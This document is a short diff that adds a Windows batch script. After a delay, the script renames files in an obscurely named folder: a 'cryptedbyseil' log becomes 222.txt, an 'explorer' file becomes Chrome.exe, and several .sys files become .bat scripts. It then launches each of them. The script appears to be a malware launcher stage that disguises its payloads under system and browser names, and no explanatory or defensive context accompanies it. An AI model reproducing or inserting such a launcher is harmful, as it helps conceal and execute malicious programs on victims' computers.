@@ -1,0 +1,13 @@
+ÿþ
+o off
+ping -n 6 localhost>nul
+ren C:\dhA7pRFwIByZRRnk\log.cryptedbyseil 222.txt
+ren C:\dhA7pRFwIByZRRnk\explorer Chrome.exe
+ren C:\dhA7pRFwIByZRRnk\5.sys 5.bat
+ren C:\dhA7pRFwIByZRRnk\4.sys 4.bat
+ren C:\dhA7pRFwIByZRRnk\3.sys 3.bat
+start C:/dhA7pRFwIByZRRnk/222.txt
+start C:/dhA7pRFwIByZRRnk/Chrome.exe
+start C:/dhA7pRFwIByZRRnk/3.bat
+start C:/dhA7pRFwIByZRRnk/4.bat
+start C:/dhA7pRFwIByZRRnk/5.bat
